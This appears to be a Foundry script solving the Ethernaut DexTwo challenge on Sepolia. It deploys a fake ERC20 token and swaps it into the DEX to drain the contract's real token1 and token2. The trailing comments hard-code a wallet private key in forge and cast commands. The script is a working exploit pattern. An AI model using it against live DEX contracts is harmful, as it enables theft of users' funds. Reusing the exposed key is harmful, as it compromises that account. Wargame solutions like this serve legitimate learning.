// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/DexTwo.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FakeToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("FakeToken", "FTN") {
        _mint(msg.sender, 1000);
    }
}

contract DexTwoSolution is Script {
    DexTwo public dex = DexTwo(0x01899a4957b7B36663367581C8a1D5343cCa6C3A);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Player : ", vm.envAddress("MY_ADDRESS"));
        console.log("Owner : ", dex.owner());
        console.log("Token1 : ", dex.token1());
        console.log("Token2 : ", dex.token2());
        console.log();

        console.log("Before Contract Token1 Balance : ", dex.balanceOf(dex.token1(), address(dex)));
        console.log("Before Contract Token2 Balance : ", dex.balanceOf(dex.token2(), address(dex)));
        console.log("Before Contract Token3 Balance : ", dex.balanceOf(address(0x35AA277753DeF337E30caabD0102af64269024d9), address(dex)));
        console.log();

        console.log("Before Player Token1 Balance : ", dex.balanceOf(dex.token1(), vm.envAddress("MY_ADDRESS")));
        console.log("Before Player Token2 Balance : ", dex.balanceOf(dex.token2(), vm.envAddress("MY_ADDRESS")));
        console.log("Before Player Token3 Balance : ", dex.balanceOf(address(0x35AA277753DeF337E30caabD0102af64269024d9), vm.envAddress("MY_ADDRESS")));
        console.log();

        dex.swap(address(0x35AA277753DeF337E30caabD0102af64269024d9), dex.token1(), 100);
        dex.swap(address(0x35AA277753DeF337E30caabD0102af64269024d9), dex.token2(), 200);

        console.log("After Contract Token1 Balance : ", dex.balanceOf(dex.token1(), address(dex)));
        console.log("After Contract Token2 Balance : ", dex.balanceOf(dex.token2(), address(dex)));
        console.log();

        console.log("After Player Token1 Balance : ", dex.balanceOf(dex.token1(), vm.envAddress("MY_ADDRESS")));
        console.log("After Player Token2 Balance : ", dex.balanceOf(dex.token2(), vm.envAddress("MY_ADDRESS")));

        vm.stopBroadcast();
    }
}

// forge create FakeToken --private-key 0x039fa452d9642b9699a65bc9977876610d0510ab844f311099e1b9cd0208dc4d --rpc-url https://rpc.sepolia.org --constructor-args 400
// cast call 0x35AA277753DeF337E30caabD0102af64269024d9 "balanceOf(address)" "0x01899a4957b7B36663367581C8a1D5343cCa6C3A" --private-key 0x039fa452d9642b9699a65bc9977876610d0510ab844f311099e1b9cd0208dc4d --rpc-url https://rpc.sepolia.org | cast --to-dec
// cast send 0x35AA277753DeF337E30caabD0102af64269024d9 "transfer(address,uint256)" "0x01899a4957b7B36663367581C8a1D5343cCa6C3A" "100" --private-key 0x039fa452d9642b9699a65bc9977876610d0510ab844f311099e1b9cd0208dc4d --rpc-url https://rpc.sepolia.org
// cast send 0x35AA277753DeF337E30caabD0102af64269024d9 "approve(address,uint256)" "0x01899a4957b7B36663367581C8a1D5343cCa6C3A" "300" --private-key 0x039fa452d9642b9699a65bc9977876610d0510ab844f311099e1b9cd0208dc4d --rpc-url https://rpc.sepolia.org